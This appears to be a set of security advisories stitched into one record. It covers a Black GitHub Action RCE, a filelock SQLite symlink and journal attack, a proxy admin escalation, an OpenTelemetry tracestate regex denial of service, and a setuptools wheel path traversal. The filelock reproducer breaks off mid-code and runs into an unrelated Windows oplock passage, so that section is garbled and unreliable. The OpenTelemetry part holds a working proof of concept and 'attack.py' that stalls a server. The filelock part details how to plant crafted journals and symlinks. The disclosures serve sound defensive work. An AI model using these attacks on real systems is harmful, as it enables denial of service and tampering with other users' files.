vulns.description: ### Summary  The GitHub Action bundled with Black can read the version from `tool.black.required-version` if `use_pyproject` is set to True. This version is not validated and therefore can be used to execute untrusted code in the context of a victim's repository.  ### Details  This is similar to the previous CVE-2026-31900. The value in `tool.black.required-version` is accepted as the version to be installed by the action without validation.  ### Proof of concept  Reproduction requires a victim to use Black's GitHub Action with `use_pyproject: true`. The attacker would then issue a PR to the victim's repository with `pyproject.toml` edited so that Black points to a malicious repository.  ### Impact  This is a remote code execution vulnerability impacting users using the GitHub Action bundled with psf/black and using the `use_pyproject: true` setting.

`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to `/proc/self/fd/<n>`, a Linux path that names the process's own open file `n`. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on `-journal`, `-wal` and `-shm` files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.  Another local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary `read_lock()` or `write_lock()` write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as `/tmp` a planted `-wal` file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the `/proc/self/fd` redirect since 4.0.9, the side-file variants since 3.20.4).  Anthropic's OSS Scanner reported this in private as `ANT-2026-KMJ2575J` [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.  ## Severity  **CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` scores 7.1 (High).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. `I:H` (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. `A:H` (high availability impact): the other user makes every acquire fail or kills the lock holder. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.  Classification from the external review: **conditional security**, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.  ## Scope and preconditions  - The other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a `0777` directory or a group-writable one (including a setgid `2775` project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is `0666`. filelock itself creates the database `0600`. - Sticky directories (`/tmp`, `/var/tmp`, any `1777` directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with `fs.protected_regular=2`). What remains is a planted non-empty `<db>-wal` (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise `sqlite3.OperationalError: disk I/O error`. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if `fs.protected_hardlinks=0`. - Two kernel settings matter. `fs.protected_regular` (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in `/tmp`, and SQLite follows a planted symlink itself (not tested). `fs.protected_hardlinks=1` (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory. - Platform and route. The `/proc/self/fd` redirect is Linux with `/proc` mounted, 4.0.9 and later. The side-file variants (`-journal`, `-wal`, `-shm`) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without `/proc`) they need the link-directory swap described under "Mechanism", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after it. Windows does not take this path. - Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename an entry in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.  ## Affected code  At the scanned commit `b831496b0273`: [`_connect_through_descriptor` builds `/proc/self/fd/<n>` and hands it to `sqlite3.connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L982-L1001). The assumption is the [comment at line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), "Descriptor paths reopen the validated inode" (an inode is the kernel's identity for a file, independent of its name). SQLite first reads the file it opened at [`PRAGMA journal_mode=MEMORY`, line 816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). The check in [`_raise_if_database_replaced` at line 836](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L836) runs only after `BEGIN`. Both [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect the descriptor, not the file SQLite is on. The one-level hard link of the macOS route is [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029).  ## Introduced  The `/proc/self/fd` redirect came with `4d45e83` ("Merge commit from fork", the fix for GHSA-j8f7-rjxc-mr56), first released in **4.0.9** (verified: `git tag --contains 4d45e83` gives 4.0.9); 4.0.8 does not have it. The side-file variants are older. They reproduce on `cfd4446` ("feat(lock): add SQLite-based ReadWriteLock (#399)"), first released in **3.20.4** (verified), which passed the lock path straight to `sqlite3.connect`.  ## Mechanism  On Linux the lock opens the database with `O_RDWR|O_CREAT|O_NOFOLLOW|O_NONBLOCK`. It checks through the descriptor that the file is a regular file and not a WAL database. It then calls `sqlite3.connect("/proc/self/fd/<n>")` and expects SQLite to reopen the validated inode. SQLite does not open that name. It runs `readlink()` on it, which yields the path string the kernel reports for the descriptor at that moment, and opens that string by path, following every symlink. Without interference the trace shows `readlink("/proc/534/fd/3") = "/tmp/benign/app.lock.db"` and then a second `openat` of that path. The descriptor contributes only a string. Once the directory entry behind the descriptor is gone, the string is `<database> (deleted)`. A symlink with that exact name sends SQLite wherever its creator chose.  The other user prepares the directory before the lock user runs. They create a database `cache.lock.db` (`0666`, so the lock user's lock accepts it) with a second hard link `cache.lock.db.keep`, and the symlink `cache.lock.db (deleted) -> /tmp/victim-notes.txt`. The lock user's `os.open` raises an inotify `IN_OPEN` event. The other user unlinks `cache.lock.db` and links `cache.lock.db.keep` back under the same name. The lock user's descriptor still refers to the unlinked entry, so `/proc/self/fd/3` now reads `/tmp/shared-cache/cache.lock.db (deleted)`. `sqlite3.connect` resolves it, follows the symlink and opens the target `O_RDWR|O_CREAT`. None of filelock's checks look at that file. `_open_lock_database` and `_raise_if_wal` inspect descriptor 3. `_raise_if_database_replaced` compares an `lstat` of the lock path with the descriptor's `(st_dev, st_ino)`, which passes because the other user linked the same inode back, and it runs only after `BEGIN`.  The damage comes from the first statement, `PRAGMA journal_mode=MEMORY`. SQLite finds `<target>-journal`, treats it as the rollback journal of an interrupted transaction, and copies its page records into the target before it checks whether the target is a database at all. The journal header supplies the page size and the page count SQLite resizes the file to. Whoever wrote the journal computed the per-page checksum. The content from offset 0 and the final length are therefore the other user's. Strace of the lock user's process (SQLite 3.40.1):  ``` openat("/tmp/shared-cache/cache.lock.db", O_RDWR|O_CREAT|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC, 0600) = 3 readlink("/proc/3819/fd/3", "/tmp/shared-cache/cache.lock.db (deleted)", 4096) = 41 readlink("/tmp/shared-cache/cache.lock.db (deleted)", "/tmp/victim-notes.txt", 4096) = 21 openat("/tmp/victim-notes.txt", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 4 openat("/tmp/victim-notes.txt-journal", O_RDWR|O_NOFOLLOW|O_CLOEXEC) = 5 pread64(5, "ATTACKER CONTENT WRITTEN BY THE "..., 4096, 516) = 4096 pwrite64(4, "ATTACKER CONTENT WRITTEN BY THE "..., 4096, 0) = 4096 unlink("/tmp/victim-notes.txt-journal") = -1 EPERM            -> "disk I/O error" ```  The redirect itself needs no journal. The constructor's validation connection already makes SQLite open the target with `O_CREAT`. With the symlink pointing at a missing path in the lock user's home, constructing the lock created that file (empty, `0644`, owned by the lock user) and raised nothing. With the symlink pointing at a `0600` WAL-mode SQLite database of the lock user, `write_lock()` returned without error and the database's header bytes 18 and 19 changed from `2 2` to `1 1`. The pragma converted the lock user's database out of WAL mode, and the redirected acquire held its SQLite lock on that database rather than on the lock database.  **Side-file names beside the database.** Two comments record the belief that SQLite names its side files after the descriptor path ([line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), [line 1095](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1095)). The path is not synthetic to SQLite. It derives `<database>-journal`, `<database>-wal` and `<database>-shm` from the resolved real path in the shared directory. `journal_mode=MEMORY` governs only journals SQLite would write, not ones it finds. These variants need no redirect.  *A hot `-journal` makes the lock user unlink a file the journal names; no race.* The other user unlinks the lock user's empty `lock.db`, puts a one-page SQLite database (`0666`) in its place, and writes a 46-byte `lock.db-journal`: a path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. SQLite treats a journal beside a non-empty database as hot (left by an interrupted transaction). The tail names a "super-journal", and recovery ends by unlinking that file. The lock user's next `read_lock()` or `write_lock()` returns without error and the named file is gone (`unlink("/home/victim/private/notes.txt") = 0`, from a `0700` directory of the lock user). The named file must be a non-empty regular file the lock user can read and unlink. A FIFO planted as `lock.db-journal` instead blocks `read_lock(timeout=2)` in SQLite's `open()` of the journal (still blocked when killed after 10 s).  *A re-planted `-wal` puts the holder in WAL mode past `_raise_if_wal`.* `_raise_if_wal` checks header bytes 18 and 19. Whenever a connection takes its first lock, SQLite stats `<db>-wal`, and if that file and the database are both non-empty it opens the WAL whatever the header says. The pragma at line 816 converts such a database and unlinks `-wal` and `-shm`. The `BEGIN` at line 833 is a separate statement that starts unlocked and stats `<db>-wal` again. Re-creating the 32-byte `-wal` in that gap landed on the first attempt in 20 of 20 runs on a 2-CPU machine.  The lock user's `with lock.write_lock():` then holds the `-shm` byte-120 WAL write lock and only SHARED on the database. Once the other user removes the `-wal`, a second process of the lock user gets `read_lock(timeout=1)` granted while the writer is inside its block, with no exception on either side. SQLite also creates `<db>-shm` with the database's permission bits (`0666`) and keeps it mapped into memory. After the other user truncates it, the writer dies with `SIGBUS` (the signal for touching a mapped file region that no longer exists) in `connection.rollback()` during `release()`.  *A `-wal` in a sticky directory makes every acquire raise; no race, no access to the database.* Beside the lock user's own empty `0600` database, a non-empty `<db>-wal` (one byte, any mode; a directory or FIFO works too) is a leftover SQLite tries to delete. In a `1777` directory the lock user cannot unlink another user's file (`unlink(...) = -1 EPERM`), so the pragma fails with `SQLITE_IOERR_DELETE`. The code in [`_do_acquire_inner`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) translates only "database is locked" into `Timeout`. `sqlite3.OperationalError: disk I/O error` therefore leaves every `acquire_read()` / `acquire_write()` (and the async variants) within milliseconds, whatever `timeout` or `blocking` says, until the file's owner or root removes it.  *Further effects observed at this commit in a non-sticky directory.* A `0755` script owned by the lock user, renamed to the lock path with a one-record journal beside it, ends up holding the other user's bytes (the acquire raises `file is not a database`). A hard link to the lock user's `0600` `~/.profile` at the lock path does the same in a sticky `/tmp` when `fs.protected_hardlinks=0`. When the locking process runs as root, SQLite runs `fchown` on a `-wal` or `-shm` it opens to match the owner of the database, so root's `0600` `service.env` renamed to `app.lock.db-wal` belonged to the other user after root's `read_lock()`.  A journal whose super-journal names the database itself makes SQLite open and close a second descriptor on the database, which drops the process's POSIX locks, so `acquire_read` returns with no lock held in `/proc/locks` and a writer in another process acquires (two journals in a row, one per statement; write locks are not affected). A one-byte `lock.db-wal` plus a `lock.db-shm` on which the other user holds two byte locks makes the acquire take 10 s regardless of `timeout` and raise `locking protocol`, or die with `SIGBUS` if the other user truncates the `-shm`.  **The hard-link route in a directory without the sticky bit.** None of the above occurs on the `_link_beside` branch (macOS, Linux without `/proc`). There SQLite's main file is `.filelock-…/lock.db` in the connecting user's `0700` directory. That protection holds only where no other user can rename the `.filelock-*` entry itself, because `0700` protects the contents, not the entry in the parent. `_link_beside` checks the link once and returns a pathname, and every later use is by that name.  With `/proc` hidden in a `0777` directory, the other user staged a directory holding a hard link `lock.db` to a one-page database and a hot `lock.db-journal`. They held `BEGIN EXCLUSIVE` on the database so the lock user's first statement waited in the busy handler (SQLite's retry loop for a locked database), renamed the lock user's `.filelock-*` directory aside, renamed the staged directory onto its name and rolled back. SQLite got SHARED, found the journal under the swapped name and unlinked the file it named. The lock user's process reported the lock held and exited 0. A polling variant without the write lock also won (in 40 trials the file was gone after 1 to 26 starts of the lock user's program). Under the sticky bit the rename fails with `EPERM`.  ## Reproduction  The scanner's reproducer for `ANT-2026-KMJ2575J`, quoted as received. It ran against commit `b831496b0273`.  **`repro`**  ```python #!/usr/bin/env python3 import os import shutil import subprocess import sys  as_victim = {"user": "victim", "group": "victim", "extra_groups": []} as_attacker = {"user": "attacker", "group": "attacker", "extra_groups": []}  # set up: the lock database lives in a shared cache directory, 0777 and not sticky shared_dir = "/tmp/shared-cache" lock_db = shared_dir + "/cache.lock.db" shutil.rmtree(shared_dir, ignore_errors=True) os.mkdir(shared_dir) os.chmod(shared_dir, 0o777)  # set up: a private 0600 file of the victim's in sticky /tmp, which the attacker cannot write target = "/tmp/victim-notes.txt" for leftover in (target, target + "-journal"):     if os.path.lexists(leftover):         os.unlink(leftover) original = b"original victim notes

Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.  A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. ### Summary  An authenticated user with `internal_user` privileges can escalate to `proxy_admin` and achieve remote code execution. The proxy uses one encryption key for two purposes: sealing secrets at rest and minting session tokens. An attacker exploits this by requesting a new API key with a crafted metadata field containing a forged admin credential as the "secret" value. The proxy encrypts and returns this payload. When this value is then presented as a bearer token, the proxy decrypts it, trusts the forged admin identity, and grants full administrative access, including the ability to execute arbitrary commands via the MCP stdio endpoint.  ### Affected versions  Versions later than 1.91.0 are exploitable in the default configuration. Versions 1.87.0 through 1.90.x are exploitable only if `EXPERIMENTAL_UI_LOGIN=true` was explicitly set.  ### Mitigation  Upgrade to a patched version as soon as possible.  If you cannot upgrade immediately, set `EXPERIMENTAL_UI_LOGIN=false`. This disables the vulnerable authentication path but also breaks CLI SSO and Claude Code gateway login.  ### Impact  An internal user can escalate to proxy admin and execute arbitrary commands on the host.  **Discovery Credit:** Hoa X. Nguyen (OPSWAT Unit 515)

## Summary `TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.  ## Affected component / version - Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`). - Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between. - Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.  ## Details  1. The header reaches the parser without any length check:  ```python # opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57 tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size if tracestate_headers is None:     tracestate = None else:     tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61) ```  2. The split pattern and the parser: ```python # opentelemetry-api/src/opentelemetry/trace/span.py:45 _TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split _delimiter_pattern = re.compile(r"[ 	]*,[ 	]*")      # <-- (line 46) starts with an unbounded [ 	]*  # span.py:382 @classmethod def from_header(cls, header_list: list[str]) -> TraceState:     pairs = {}  # type: dict[str, str]     for header in header_list:         members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"         for member in members:             if not member:                 continue             match = _member_pattern.fullmatch(member)             if not match:                 _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)                     "Member doesn't match the w3c identifiers format %s",                     member,                 )                 return cls()             ... ```  `re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ 	]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.  3. The sibling propagator already has the missing guard: ```python # baggage/propagation/__init__.py:68 _MAX_HEADER_LENGTH = 8192 ... if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent     _logger.warning(...)     return context ```  A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s. Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower).   Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.  ## Proof of concept  ### A. Show the quadratic cost (no server needed)  1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected). 2. Save as `poc_tracestate.py`: ```python import logging import time  from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator  # The library logs the whole malformed member at WARNING; silence it so the timings stay readable. logging.disable(logging.CRITICAL)  TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01" propagator = TraceContextTextMapPropagator()  previous = None for n in (10_000, 20_000, 40_000, 80_000):     # N spaces after a valid member, no comma anywhere in the header     carrier = {"traceparent": TRACEPARENT, "tracestate": "a=b" + " " * n + "x"}     start = time.perf_counter()     propagator.extract(carrier)     elapsed = time.perf_counter() - start     growth = f"x{elapsed / previous:.1f}" if previous else "-"     print(f"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}")     previous = elapsed ``` 3. Run `python poc_tracestate.py`. 4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run: ```   10000 characters    0.06 s  growth when size doubles: -   20000 characters    0.26 s  growth when size doubles: x4.0   40000 characters    1.04 s  growth when size doubles: x4.0   80000 characters    4.13 s  growth when size doubles: x4.0 ``` Replace `" "` with `"	"` to see ≈1.6× longer.  ### B. Show that one request stalls a real server This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).  1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi "uvicorn[standard]"`. 2. Save as `app.py`: ```python from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware   async def app(scope, receive, send):     await send({"type": "http.response.start", "status": 200, "headers": [(b"content-type", b"text/plain")]})     await send({"type": "http.response.body", "body": b"ok"})   app = OpenTelemetryMiddleware(app) ``` 3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools` 4. Save as `attack.py`: ```python """Send one oversized tracestate request and, while it is being handled, measure how long an unrelated request to the same server has to wait.""" import socket import sys import threading import time  HOST, PORT = "127.0.0.1", 8000 N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000 TRACEPARENT = "00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01"   def get(path, extra=""):     s = socket.create_connection((HOST, PORT), timeout=120)     s.sendall(f"GET {path} HTTP/1.1
Host: x
Connection: close
{extra}
".encode())     start, data = time.perf_counter(), b""     while chunk := s.recv(65536):         data += chunk     return time.perf_counter() - start, data.split(b"
")[0].decode()   result = {} extra = f"traceparent: {TRACEPARENT}
tracestate: a=b{' ' * N}x
" attacker = threading.Thread(target=lambda: result.update(a=get("/attack", extra))) print("idle /ping:               %.3f s  %s" % get("/ping")) attacker.start() time.sleep(0.5)  # let the attack request reach the server first print("/ping during the attack:  %.3f s  %s" % get("/ping")) attacker.join() print("attack request itself:    %.3f s  %s" % result["a"]) ``` 5. In a second terminal run `python attack.py 100000`. 6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run: ``` idle /ping:               0.000 s  HTTP/1.1 200 OK /ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked) attack request itself:    6.408 s  HTTP/1.1 200 OK ``` 7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.  ## Severity **Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.  **Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.  **Severity: Medium.**  ## Suggested remediation Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input: ```diff --- a/opentelemetry-api/src/opentelemetry/trace/span.py +++ b/opentelemetry-api/src/opentelemetry/trace/span.py @@ def from_header(cls, header_list: list[str]) -> TraceState:          for header in header_list: -            members: list[str] = re.split(_delimiter_pattern, header) +            members: list[str] = [m.strip(" 	") for m in header.split(",")] ``` `_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.  ## Credit  Discovered and reported by SecDim Security Research secdim.com | @secdim | security@secdim.com  ---  **FROM MAINTAINERS**  ## Summary  `TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.  Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.  ## Impact  Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.  The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.  Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.  The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.  ## Patches  Versions of `opentelemetry-api` up to and including `1.45.0` are affected.  Upgrade `opentelemetry-api` to version `1.45.1` or later.  Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.  ## Workarounds  Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.

### Summary  On Windows, attacker-controlled content in a wheel's `.dist-info/namespace_packages.txt` can cause setuptools' legacy wheel installation path to create an `__init__.py` outside the requested `destination_eggdir`.  The attacker can influence the destination path, but not the contents of the created file.  ### Details  Tested setuptools commit:  `6ead555c5fb29bc57fe6105b1bffc163f56fd558`  Relevant source:  `setuptools/wheel.py`  SHA-256:  `359b7e0d5dd8c3135653abe08a8ed5dc0352eadfd7df22cb5e2b5303b7c3cafd`  The relevant call path is:  `Wheel(wheel_path).install_as_egg(destination)` → `_install_as_egg` → `_convert_metadata` → `_fix_namespace_packages`  A wheel can provide attacker-controlled content in:  `<distribution>.dist-info/namespace_packages.txt`  The namespace value is eventually used approximately as:  ```python mod_dir = os.path.join(destination_eggdir, *mod.split('.')) mod_init = os.path.join(mod_dir, '__init__.py')  If mod is a Windows drive-qualified absolute path containing no dots, mod.split('.') preserves it as a single component. On Windows, os.path.join(destination_eggdir, absolute_component) discards the original base directory and resolves to the attacker-supplied absolute path. The existing wheel filename and ZIP traversal checks do not validate this metadata value before it is subsequently interpreted as a filesystem path.  ```markdown ### PoC  The reproduction was performed entirely inside a disposable temporary directory.  Layout:  ```text sandbox/     destination/     outside/     input/     canary.txt ```  A synthetic wheel was created containing:  `demo_pkg-1.0.dist-info/namespace_packages.txt`  whose content was the absolute path of:  `sandbox\outside`  The real acquired setuptools implementation was then invoked:  ```python setuptools.wheel.Wheel(synthetic_wheel).install_as_egg(     sandbox_destination ) ```  The operation completed without exception.  Expected metadata was created under:  `sandbox\destination\EGG-INFO`  but setuptools also created:  `sandbox\outside\__init__.py`  The file did not exist before execution.  Its contents were:  ```python __import__('pkg_resources').declare_namespace(__name__) ```  The unrelated canary remained byte-identical.  The sandbox was deleted after recording the evidence. ```   ### Impact  A crafted wheel can cause setuptools to create a fixed-content `__init__.py` outside the intended installation directory at a filesystem path influenced by the wheel, with the permissions of the process performing the installation.  The demonstrated reproduction required the target parent directory to already exist.
